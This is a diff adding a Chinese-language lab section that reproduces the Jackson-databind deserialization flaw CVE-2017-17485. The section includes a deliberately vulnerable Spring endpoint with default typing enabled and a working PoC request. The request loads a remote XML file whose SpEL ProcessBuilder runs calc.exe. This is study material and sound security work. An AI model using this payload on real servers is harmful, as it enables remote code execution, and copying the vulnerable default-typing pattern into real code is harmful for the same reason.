@@ -151,6 +151,77 @@ Content-Length: 127
 下面演示从HTTP请求到Spring的方法，然后readValue，最后触发gadget的方法。这里是一个SSRF的例子。
 ![](jackson-JsonTypeInfo_id_class-poc.gif)
 
+### 复现CVE-2017-17485
+
+#### 影响范围
+- Jackson-databind version <= 2.9.3
+
+- Jackson-databind version <= 2.7.9.1
+
+- Jackson-databind version <= 2.8.10
+参考：https://github.com/RealBearcat/Jackson-CVE-2017-17485
+
+#### 漏洞环境
+修改pom.xml，将jackson-databind的版本设置为2.9.3：
+```xml
+        <dependency>
+            <groupId>com.fasterxml.jackson.core</groupId>
+            <artifactId>jackson-databind</artifactId>
+            <version>2.9.3</version>
+    	</dependency>
+```
+
+使用已有的存在漏洞的代码：
+```java
+    static class ABean {
+        public int id;
+        public Object obj;
+    }
+
+    @RequestMapping(value = "/deserialize2", method = {RequestMethod.POST})
+    @ResponseBody
+    public static String deserialize2(@RequestBody String params) throws IOException {
+        // 如果Content-Type不设置application/json格式，post数据会被url编码
+        System.out.println(params);
+        try {
+            ObjectMapper objectMapper = new ObjectMapper();
+            objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);
+            objectMapper.readValue(params, ABean.class);
+            return "deserialize2";
+        }  catch (Exception e){
+            e.printStackTrace();
+            return e.toString();
+        }
+    }
+```
+
+#### PoC
+由于被反序列化的类是ABean，所以按照ABean的格式，写出如下PoC（虽然id属性不写也可以触发漏洞）：
+```http
+POST /jackson/deserialize2 HTTP/1.1
+Host: cqq.com:8080
+Connection: close
+Cookie: confluence-sidebar.width=285; confluence.browse.space.cookie=space-blogposts; JSESSIONID=55F192C960EC2BBE19F71FB85C34D41C; XSRF-TOKEN=867c4ff2-4228-4e97-b9fa-81319af3502b; remember-me=YWRtaW46MTU4NjQ4OTM3NjIwMzo0ODFhYmVjZjBhODYxMmVlOTE0NmJhZTU5OGYwN2EwMQ
+Content-Type: application/json
+Content-Length: 171
+
+{"id":1, "obj":["org.springframework.context.support.ClassPathXmlApplicationContext", "https://raw.githubusercontent.com/iBearcat/Jackson-CVE-2017-17485/master/spel.xml"]}
+```
+其中xml的内容为：
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg value="calc.exe" />
+        <property name="whatever" value="#{ pb.start() }"/>
+    </bean>
+</beans>
+```
+
+#### Demo
+![](jackson-CVE-2017-17485-poc.gif)
 
 ### 参考
 - https://github.com/JoyChou93/java-sec-code
